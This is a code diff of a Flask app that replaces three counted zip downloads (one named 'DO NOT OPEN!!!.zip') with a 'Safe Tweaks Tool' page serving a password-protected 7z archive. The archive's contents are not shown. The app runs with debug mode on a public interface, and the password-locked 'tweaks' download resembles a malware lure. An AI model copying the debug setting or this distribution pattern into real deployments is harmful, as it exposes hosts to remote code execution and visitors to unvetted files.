@@ -1,36 +1,43 @@
-from flask import Flask, send_file
+from flask import Flask, send_file, render_template_string
+import os
 
 app = Flask(__name__)
+download_count = 0
 
-# Track downloads for each file
-download_counts = {
-    "DO_NOT_OPEN": 0,
-    "Open": 0,
-    "Open_dash": 0
-}
-
+# Landing page with download button
 @app.route("/")
 def home():
-    return (
-        f"DO_NOT_OPEN.zip downloads: {download_counts['DO_NOT_OPEN']}<br>"
-        f"Open.zip downloads: {download_counts['Open']}<br>"
-        f"Open-.zip downloads: {download_counts['Open_dash']}"
-    )
+    global download_count
+    html = f"""
+    <html>
+        <head>
+            <title>Safe Tweaks Tool</title>
+        </head>
+        <body style="font-family:sans-serif; text-align:center; margin-top:50px;">
+            <h1>Safe Tweaks Tool</h1>
+            <p>Downloads so far: {download_count}</p>
+            <a href="/download">
+                <button style="font-size:20px; padding:10px 20px;">Download Now</button>
+            </a>
+            <p>After downloading, use 7-Zip with your password to extract the tool.</p>
+        </body>
+    </html>
+    """
+    return render_template_string(html)
 
-@app.route("/download/do_not_open")
-def download_do_not_open():
-    download_counts["DO_NOT_OPEN"] += 1
-    return send_file("DO NOT OPEN!!!.zip", as_attachment=True)
+# Download route
+@app.route("/download")
+def download():
+    global download_count
+    download_count += 1
 
-@app.route("/download/open")
-def download_open():
-    download_counts["Open"] += 1
-    return send_file("Open.zip", as_attachment=True)
+    # Ensure Flask finds the file in the same folder as app.py
+    file_path = os.path.join(os.path.dirname(__file__), "SafeTweaks.7z")
+    if not os.path.exists(file_path):
+        return "File not found!", 404
 
-@app.route("/download/open_dash")
-def download_open_dash():
-    download_counts["Open_dash"] += 1
-    return send_file("Open-.zip", as_attachment=True)
+    return send_file(file_path, as_attachment=True)
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=5000)
+    # On Render, host/port are handled automatically
+    app.run(host="0.0.0.0", port=5000, debug=True)
